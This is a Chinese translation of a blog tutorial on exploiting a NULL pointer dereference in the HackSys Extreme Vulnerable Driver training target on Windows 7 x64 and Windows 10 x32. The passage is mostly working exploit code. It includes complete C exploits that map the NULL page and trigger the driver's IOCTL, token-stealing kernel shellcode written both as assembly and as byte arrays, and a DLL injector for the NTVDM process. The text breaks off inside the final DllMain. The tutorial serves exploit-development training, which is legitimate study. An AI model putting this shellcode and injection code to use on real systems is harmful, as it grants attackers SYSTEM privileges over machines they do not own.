> 原文链接: https://www.anquanke.com//post/id/95114 


# Windows 10内核驱动漏洞利用：空指针引用


                                阅读量   
                                **122334**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者XPN，文章来源：xpnsec.com
                                <br>原文地址：[https://blog.xpnsec.com/hevd-null-pointer/](https://blog.xpnsec.com/hevd-null-pointer/)

译文仅供参考，具体内容表达以及含义原文为准

## 前言

在这一系列文章中，我们通过HackSys团队提供的HEVD驱动程序，来探索内核驱动程序的漏洞利用方式。<br>
这一次，我们将关注空指针引用（NULL pointer dereferences，其中dereference一词是指取指针指向的对象的值，请大家务必理解这个名词，并不是常规意义上的引用），并演示如何在Windows 7 x64和Windows 10 x32上利用这类漏洞。<br>
空指针引用错误正在逐渐成为现代操作系统上漏洞利用的一个难题。由于Windows 8以及更高版本中，用户模式进程无法使用NULL页，所以看起来，此类漏洞已经被缓解。<br>
然而，我们知道，Windows 7仍然是很多人都在使用的流行的操作系统。并且，由于向后兼容性，Windows 10的32位版本存在一个弱点。<br>
为了展现在这些操作系统上漏洞利用的一些细微差别，我们会尝试进行两次漏洞攻击，目的是实现对SYSTEM用户的权限提升。

## 实验环境配置

在本教程中，我们将在实验环境中部署3个虚拟机：调试虚拟机、Windows 7 x64虚拟机、Windows 10 x32虚拟机。<br>
如果您还没有阅读本系列的第一篇文章，我强烈建议您先进行阅读：[https://blog.xpnsec.com/hevd-stack-overflow/](https://blog.xpnsec.com/hevd-stack-overflow/) ，这篇文章中详细讲解了如何设置环境以及如何将内核调试程序连接到Windows 10虚拟机的详细方法。<br>
在这篇文章中，还讲解了如何在VirtualBox中设置一个用于内核调试的Windows 7主机。如果您还有印象的话，我们以前曾经使用过Windows 10内核调试器的NET选项，但在早期版本中并不支持这一功能。因此，我们将恢复使用虚拟串行端口（Virtual Serial Port）。<br>
首先，在您的Windows 7虚拟主机的设置中，选择“端口”，并确保已经启用串行端口。作为macOS用户，我被要求提供一个命名管道（Named Pipe）的路径，在不同操作系统上可能会有所不同。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fa48fa022e0036e6.png)<br>
选择“连接到现有管道/Socket”选项非常重要，它将会允许虚拟串行端口在需要时建立与内核调试器VM的连接。<br>
接下来，在我们的调试虚拟机上，需要进行一个类似的配置，提供相同的命名管道路径，但这次我们要确保不选择“连接到现有管道/Socket”选项。<br>
现在，在您的调试主机上，设置WinDBG通过COM端口连接：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b59aaf8e1691d083.png)<br>
在Windows 7主机上，在管理员权限命令提示符中输入以下内容：<br>
bcdedit /debug on bcdedit /dbgsettings SERIAL<br>
重新启动Windows 7主机，WinDBG就可以正常使用了。<br>
现在我们已经完成了虚拟机的设置，接下来就让我们来研究这个漏洞。

## 漏洞分析

与我们的HEVD步骤的第一部分类似，首先我们回顾一下即将要实现的功能的源代码，在此例中是TriggerNullPointerDereference。<br>
该函数首先在栈中分配一些变量：

```
NTSTATUS TriggerNullPointerDereference(IN PVOID UserBuffer) `{`     ULONG UserValue = 0;     ULONG MagicValue = 0xBAD0B0B0;     NTSTATUS Status = STATUS_SUCCESS;   PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;
```

NullPointerDereference变量是一个指向分配的内存块的指针：

```
// Allocate Pool chunk
    NullPointerDereference = (PNULL_POINTER_DEREFERENCE)
                              ExAllocatePoolWithTag(NonPagedPool,
                                                    sizeof(NULL_POINTER_DEREFERENCE),
                                                    (ULONG)POOL_TAG);
```

一旦分配完成，我们的DeviceloControl输入缓冲区就会被处理，并从内存读取ULONG并存储在UserValue变量中：

```
// Get the value from user mode     UserValue = *(PULONG)UserBuffer;
```

然后，使用if语句来验证用户模式应用程序传递的值实际上是否设置为MagicValue。如果未设置，则释放先前分配的内存：

```
// Validate the magic value
    if (UserValue == MagicValue) `{`
        ...
    `}`
    else `{`
        DbgPrint("[+] Freeing NullPointerDereference Objectn");
        DbgPrint("[+] Pool Tag: %sn", STRINGIFY(POOL_TAG));
        DbgPrint("[+] Pool Chunk: 0x%pn", NullPointerDereference);

        // Free the allocated Pool chunk
        ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);

        // Set to NULL to avoid dangling pointer
        NullPointerDereference = NULL;
   `}`
```

最后，我们发现NullPointerDereference变量被用来调用一个函数指针：

```
DbgPrint("[+] Triggering Null Pointer Dereferencen");

    // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
    // because the developer is not validating if 'NullPointerDereference' is NULL
    // before calling the callback function
NullPointerDereference-&gt;Callback();
```

这就意味着，由于在使用前缺少对NullPointerDereference变量的检查，因此就存在空指针引用漏洞。如果应用程序触发一个DeviceloControl调用，传递一个与MagicValue不匹配的值，然后再NULL处提供一个函数指针（偏移量为0x4或0x8，我们稍后会提及），就能够被利用。<br>
然而，在许多现代操作系统中，NULL页不再可用，这就意味着这样的漏洞会更难以利用。<br>
接下来，我们将开始介绍如何在Windows 7上利用这类漏洞，我们知道Windows 7不受NULL页保护。

## Windows 7漏洞利用

Windows 7为攻击者提供了一个选项，通过ZwAllocateVirtualMemory的API调用来映射NULL页，其具有以下签名：

```
NTSTATUS ZwAllocateVirtualMemory(
  _In_    HANDLE    ProcessHandle,
  _Inout_ PVOID     *BaseAddress,
  _In_    ULONG_PTR ZeroBits,
  _Inout_ PSIZE_T   RegionSize,
  _In_    ULONG     AllocationType,
  _In_    ULONG     Protect
);
```

我们特别感兴趣的是BaseAddress参数：<br>
“该参数是指向一个变量的指针，该变量会接收分配的页面区域的基地址。如果此参数的初始值非NULL，则从指定的虚拟地址开始分配区域，并向下舍入到下一个主机页大小的地址边界。如果此参数的初始值为NULL，则操作系统将会确定分配区域的位置。”<br>
这意味着，如果我们请求1h的BaseAddress，NULL页将被映射到进程地址空间中，可以任意使用。这是我们用来捕获尝试访问NULL地址的过程。<br>
现在，我们知道可以去触发一个空指针引用，而且我们也知道下面的调用负责一个回调函数的调用：

```
NullPointerDereference-&gt;Callback();
```

接下来，我们迅速查看与NullPointerDereference变量关联的类型，可以发现能在64位系统上偏移量0x8处找到Callback属性：

```
typedef struct _NULL_POINTER_DEREFERENCE `{`
    ULONG Value;
    FunctionPointer Callback;
`}` NULL_POINTER_DEREFERENCE, *PNULL_POINTER_DEREFERENCE;
```

因此，我们利用该漏洞，在NULL页分配内存，并在地址8h处设置一个指向我们Shellcode的指针（我们现在只使用一个cc Int-3d断点作为Shellcode），如下所示：

```
// Get a pointer to the internal ZwAllocateVirtualMemory call
typedef NTSTATUS (* WINAPI ZwAllocateVirtualMemory)(
    _In_    HANDLE    ProcessHandle,
    _Inout_ PVOID     *BaseAddress,
    _In_    ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T   RegionSize,
    _In_    ULONG     AllocationType,
    _In_    ULONG     Protect
);

ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");

// Map the NULL page into our process address space
PVOID memAddr = (PVOID)1;
SIZE_T regionSize = 4096;

NTSTATUS alloc = _ZwAllocateVirtualMemory(
    GetCurrentProcess(), 
    &amp;memAddr, 
    0, 
    &amp;regionSize, 
    MEM_COMMIT | MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE
);

// Add our breakpoint shellcode
memset((void*)0x100, 'xcc', 0x100);

// Set the Callback() address
*(unsigned long long*)0x8 = 0x100;
```

为了与驱动程序交互，并触发漏洞，我们将使用与此前文章中类似的一组调用：

```
HANDLE driverHandle = CreateFileA(
    "\\.\HackSysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);

char exploit[1024];

memset(exploit, 'A', sizeof(exploit));
DeviceIoControl(
    driverHandle,
    HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
    exploit,
    sizeof(exploit),
    NULL,
    0,
    NULL,
    NULL
);
```

编译后运行，我们得到如下结果：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01477091a6b56804c9.png)<br>
非常棒，目前我们已经控制了rip地址。在这个阶段，我们希望使用此前文章中的Shellcode，并且得到我们的SYSTEM Shell。然而请注意，我们以前的Shell是为Windows 10开发的，而现在正在对Win 7进行漏洞利用的尝试，因此我们需要调整Shellcode的偏移量，以匹配早期的Windows版本。<br>
最简单的方法是在WinDBG中使用dt命令，例如：

```
dt nt!_KPRCB
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e058072dc8d0739b.png)<br>
在所有的偏移量都更新之后，得到的Shellcode如下：

```
[BITS 64]

  push rax
  push rbx
  push rcx
  push rsi
  push rdi

  mov rax, [gs:0x180 + 0x8]   ; Get 'CurrentThread' from KPRCB

  mov rax, [rax + 0x210]       ; Get 'Process' property from current thread

next_process:
  cmp dword [rax + 0x180], 0x41414141  ; Search for 'cmd.exe' process ('AAAA' replaced by exploit)
  je found_cmd_process
  mov rax, [rax + 0x188]            ; If not found, go to next process
  sub rax, 0x188
  jmp next_process

found_cmd_process:
  mov rbx, rax                     ; Save our cmd.exe EPROCESS for later

find_system_process:
  cmp dword [rax + 0x180], 0x00000004  ; Search for PID 4 (System process)
  je found_system_process
  mov rax, [rax + 0x188]
  sub rax, 0x188
  jmp find_system_process

found_system_process:
  mov rcx, [rax + 0x208]            ; Take TOKEN from System process
  mov [rbx+0x208], rcx              ; And copy it to the cmd.exe process

  pop rdi
  pop rsi
  pop rcx
  pop rbx
  pop rax
```

剩下要做的，就是产生一个新的cmd.exe进程，并更新我们的Shellcode来搜索正确的进程PID：

```
STARTUPINFOA si;
PROCESS_INFORMATION pi;

ZeroMemory(&amp;si, sizeof(STARTUPINFO));
ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));

si.cb = sizeof(STARTUPINFOA);
if (!CreateProcessA(
    NULL,
    (LPSTR)"cmd.exe",
    NULL,
    NULL,
    true,
    CREATE_NEW_CONSOLE,
    NULL,
    NULL,
    &amp;si,
    &amp;pi
)) `{`
    printf("[!] FATAL: Error spawning cmd.exen");
    return 0;
`}`
*(DWORD *)((char *)shellcode + 27) = pi.dwProcessId;
```

接下来，将我们的Shellcode复制0x100，准备好被调用：

```
memcpy((void*)0x100, shellcode, sizeof(shellcode));
```

结合之后，我们最终的漏洞利用代码如下：

```
#include "stdafx.h"

#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
    _In_    HANDLE    ProcessHandle,
    _Inout_ PVOID     *BaseAddress,
    _In_    ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T   RegionSize,
    _In_    ULONG     AllocationType,
    _In_    ULONG     Protect
    );

char shellcode[256] = `{`
    0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25,
    0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x10, 0x02, 0x00,
    0x00, 0x81, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x41, 0x41, 0x41,
    0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00,
    0x48, 0x2d, 0x88, 0x01, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89,
    0xc3, 0x83, 0xb8, 0x80, 0x01, 0x00, 0x00, 0x04, 0x74, 0x0f,
    0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2d, 0x88,
    0x01, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x08, 0x02,
    0x00, 0x00, 0x48, 0x89, 0x8b, 0x08, 0x02, 0x00, 0x00, 0x5f,
    0x5e, 0x59, 0x5b, 0x58, 0xc3, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff
`}`;

int main()
`{`
    printf("HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE Windows 7 x64 exploitnt@_xpn_nn");
    ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");

    PVOID memAddr = (PVOID)1;
    SIZE_T regionSize = 4096;
    char exploit[1024];

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&amp;si, sizeof(STARTUPINFO));
    ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));

    printf("[*] Mapping NULL page via ZwAllocateVirtualMemory()n");

    NTSTATUS alloc = _ZwAllocateVirtualMemory(
        GetCurrentProcess(),
        &amp;memAddr,
        0,
        &amp;regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (alloc != 0) `{`
        printf("[!] Error mapping memoryn");
        return 0;
    `}`

    printf("[*] Success, memory mappedn");
    printf("[*] Opening handle to device drivern");
    HANDLE driverHandle = CreateFileA(
        "\\.\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) `{`
        printf("[!] Error opening handlen");
        return 0;
    `}`
    printf("[*] Handle opened successfullyn");

    printf("[*] Spawning a new cmd.exe processn");
    si.cb = sizeof(STARTUPINFOA);
    if (!CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe",
        NULL,
        NULL,
        true,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
    )) `{`
        printf("[!] FATAL: Error spawning cmd.exen");
        return 0;
    `}`
    printf("[*] cmd.exe spawnedn");

    Sleep(1000);

    printf("[*] Updating our shellcode to search for PID %dn", pi.dwProcessId);
    *(DWORD *)((char *)shellcode + 27) = pi.dwProcessId;

    printf("[*] Setting Callback() pointer at 0x08 to point to shellcoden");
    *(unsigned long long*)0x8 = 0x100;

    printf("[*] Copying shellcode to 0x100n");
    memcpy((void*)0x100, shellcode, sizeof(shellcode));

    printf("[*] Sending IOCTL to trigger exploitn");
    memset(exploit, 'A', sizeof(exploit));
    DeviceIoControl(
        driverHandle,
        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
        exploit,
        sizeof(exploit),
        NULL,
        0,
        NULL,
        NULL
    );
    printf("[*] Done, enjoy your new system shell :)n");

    return 0;
`}`
```

最后，成功运行：

[![](https://p2.ssl.qhimg.com/t01893845da8ae3d6af.gif)](https://p2.ssl.qhimg.com/t01893845da8ae3d6af.gif)在Windows 7成功利用漏洞之后，我们开始研究Windows 10。

## Windows 10漏洞利用

Windows在新版本中，引入了安全保护，防止用户进程映射NULL页，因此我们在上面的例子中所进行的操作就无法实现了。我们必须寻找一种替代方案，这时，NTVDM和NT虚拟DOS主机映入我们的脑海。<br>
NTVDM是一个Windows 10 x86上的可选功能，用于支持16位应用程序。为了运行16位应用程序，系统将会启动名为NTVDM.exe的进程，并会映射NULL页。我之前在我关于WARBIRD（ [https://blog.xpnsec.com/windows-warbird-privesc/](https://blog.xpnsec.com/windows-warbird-privesc/) ）的帖子中利用过这一漏洞，今天我们将再次利用。<br>
为了利用NTVDM.exe映射的NULL页，我们将在进程中注入一个DLL，并复制我们的Shellcode。但是，利用这个漏洞时需要注意一些事项：<br>
1、NTVDM子系统默认是禁用的；<br>
2、需要管理员账户才可以启用此功能。<br>
我们在测试机器上用以下命令设置NTVDM：<br>
fondue /enable-feature:ntvdm /hide-ux:all<br>
现在，如果我们运行一个16位的应用程序，比如debug.exe，我们将看到NTVDM.exe进程启动：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019ae7449c695970e6.png)<br>
接下来，我们需要NTVDM加载我们得漏洞。为此，我们将会使用典型的VirtualAllocEx/WriteProcessMemory/CreateRemoteThread技术来加载DLL。我正在计划写一篇关于进程注入的文章，因此在这里并不会过多介绍这一方法的细节。而我们注入的内容可以在下面看到，此前有一篇相关的博客文章，感兴趣的话可以阅读：[https://blog.xpnsec.com/windows-warbird-privesc/](https://blog.xpnsec.com/windows-warbird-privesc/) 。

```
#include "stdafx.h"

void PrintUsage(void) `{`
    printf("Windows NTVDM DLL Injectionn");
    printf("Created by @_xpn_n");
`}`

int main(int argc, char **argv)
`{`
    int pid = 0;
    HANDLE pHandle;
    SIZE_T written = 0;
    void *destMem, *loadLibrary;
    char currentDir[MAX_PATH];
    char dllPath[MAX_PATH];

    PrintUsage();

    if (argc != 2) `{`
        printf("Usage: %s NTVDM_PIDn");
        printf("Note: NTVDM can be launched by executing debug.exenn");
        return 1;
    `}`

    pid = atoi(argv[1]);

    if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == NULL) `{`
        printf("[X] OpenProcess() failed, make sure PID is for NTVDM processn");
        return 2;
    `}`
    else `{`
        printf("[.] OpenProcess() completed, handle: %dn", pHandle);
    `}`

    if ((destMem = VirtualAllocEx(pHandle, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL) `{`
        printf("[X] VirtualAllocEx() failed to allocate memory in processn");
        return 3;
    `}`
    else `{`
        printf("[.] VirtualAllocEx() allocated memory at %pn", destMem);
    `}`

    if ((loadLibrary = (void *)GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA")) == NULL) `{`
        printf("[X] GetProcAddress() failed to find address of LoadLibrary()n");
        return 3;
    `}`
    else `{`
        printf("[.] Found LoadLibrary() at address %pn", loadLibrary);
    `}`

    GetCurrentDirectoryA(sizeof(currentDir), currentDir);
    sprintf_s(dllPath, sizeof(dllPath), "%s\%s", currentDir, "exploit.dll");

    if (WriteProcessMemory(pHandle, destMem, dllPath, strlen(dllPath), &amp;written) == 0) `{`
        printf("[X] WriteProcessMemory() failedn");
        return 3;
    `}`
    else `{`
        printf("[.] WriteProcessMemory() successfully wrote exploit DLL path to NTVDMn");
    `}`

    if (CreateRemoteThread(pHandle, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibrary, destMem, NULL, NULL) == NULL) `{`
        printf("[X] CreateRemoteThread() failed to load DLL in victim processn");
        return 3;
    `}`
    else `{`
        printf("[!!!] CreateRemoteThread() finished, exploit running...n");
    `}`

    printf("[!!!] If the exploit was successful, you should now be SYSTEM... enjoy :Dnn");
`}`
```

现在，我们需要制作一个DLL来承载我们的漏洞代码。由于DLL将被注入NTVDM.exe的进程地址空间，因此我们需要：<br>
1、编写内核Shellcode，该Shellcode要支持Windows 10的x86版本；<br>
2、一旦我们的DLL被加载，就要复制Shellcode到地址100h处；<br>
3、在地址4h处，添加一个指向Shellcode的指针，以便Callback属性使用；<br>
4、为HEVD驱动程序触发DeviceloControl，它会将执行传递给Shellcode。<br>
首先，看看我们的内核Shellcode。对于这个漏洞，我们重新使用此前WARBIRD的Shellcode，它会寻找cmd.exe进程，并从特权系统进程中复制进程令牌。

```
pushad
mov eax, [fs:0x120 + 0x4]   ; Get 'CurrentThread' from KPRCB

mov eax, [eax + 0x150]       ; Get 'Process' property from current thread

next_process:
cmp dword [eax + 0x17c], 'cmd.'  ; Search for 'cmd.exe' process
je found_cmd_process
mov eax, [eax + 0xb8]            ; If not found, go to next process
sub eax, 0xb8
jmp next_process

found_cmd_process:
mov ebx, eax                     ; Save our cmd.exe EPROCESS for later

find_system_process:
cmp dword [eax + 0xb4], 0x00000004  ; Search for PID 4 (System process)
je found_system_process
mov eax, [eax + 0xb8]
sub eax, 0xb8
jmp find_system_process

found_system_process:
mov ecx, [eax + 0xfc]            ; Take TOKEN from System process
mov [ebx+0xfc], ecx              ; And copy it to the cmd.exe process

popad
ret
```

在这里，需要注意这个32位的Ring-0 Shellcode和我们之前Win 7 x64的Shellcode还是有一些细微区别的：<br>
1、用来派生KPRCB结构的段寄存器是fs寄存器而不是gs寄存器；<br>
2、所有到nt!_EPROCESS、nt!_KTHREAD和nt!KPRCB结构的偏移量都是不同的。<br>
我们有了Shellcode之后，就可以对它进行编译：

```
nasm /tmp/win10-32.asm -o /tmp/win10-32.bin -f bin
```

并提取一个C缓冲区：

```
radare2 -b 32 -c 'pc' /tmp/win10-32.bin
```

这样，我们得到的C缓冲区如下：

```
const uint8_t buffer[] = `{`
  0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x80, 0x50,
  0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63,
  0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00,
  0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3,
  0x83, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x74, 0x0d, 0x8b,
  0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00,
  0xeb, 0xea, 0x8b, 0x88, 0xfc, 0x00, 0x00, 0x00, 0x89, 0x8b,
  0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff, 0xff, 0xff, 0xff,
`}`;
```

接下来，就需要编写我们的DLL。类似于Windows 7漏洞，需要通过DeviceloControl调用来触发空指针引用：

```
HANDLE driverHandle = CreateFileA(
    "\\.\HackSysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);

char exploit[1024];

memset(exploit, 'A', sizeof(exploit));
DeviceIoControl(
    driverHandle,
    HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
    exploit,
    sizeof(exploit),
    NULL,
    0,
    NULL,
    NULL
);
```

然而，在我们触发之前，需要确保Shellcode已经到位。首先通过利用VirualProtect来确保NULL页被设置为RWX：

```
DWORD oldProt;

// Make sure that NULL page is RWX
VirtualProtect(0, 4096, PAGE_EXECUTE_READWRITE, &amp;oldProt);
```

接下来，将Shellcode复制到地址100h：

```
// Copy our shellcode to the NULL page at offset 0x100
RtlCopyMemory((void*)0x100, shellcode, 256);
```

最后，我们在4h设置一个指向Shellcode的指针，这是驱动程序使用的Callback()属性的32位偏移量：

```
// Set the -&gt;Callback() function pointer
*(unsigned long long *)0x04 = 0x100;
```

结合起来，我们最终的漏洞利用代码如下：

```
#include "stdafx.h"

#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)

// Shellcode to be executed by exploit
const char shellcode[256] = `{`
    0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x80, 0x50,
    0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63,
    0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00,
    0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3,
    0x83, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x74, 0x0d, 0x8b,
    0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00,
    0xeb, 0xea, 0x8b, 0x88, 0xfc, 0x00, 0x00, 0x00, 0x89, 0x8b,
    0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff
`}`;

void exploit(void) `{`
    DWORD BytesReturned;

    DWORD oldProt;

    // Make sure that NULL page is RWX
    VirtualProtect(0, 4096, PAGE_EXECUTE_READWRITE, &amp;oldProt);

    // Set the -&gt;Callback() function pointer
    *(unsigned long long *)0x04 = 0x100;

    // Copy our shellcode to the NULL page at offset 0x100
    RtlCopyMemory((void*)0x100, shellcode, 256);

    HANDLE driverHandle = CreateFileA(
        "\\.\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    char exploit[1024];

    // Trigger the vulnerability
    memset(exploit, 'A', sizeof(exploit));
    DeviceIoControl(
        driverHandle,
        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
        exploit,
        sizeof(exploit),
        NULL,
        0,
        NULL,
        NULL
    );
`}`

BOOL APIENTRY DllMain( HMODULE hModule,
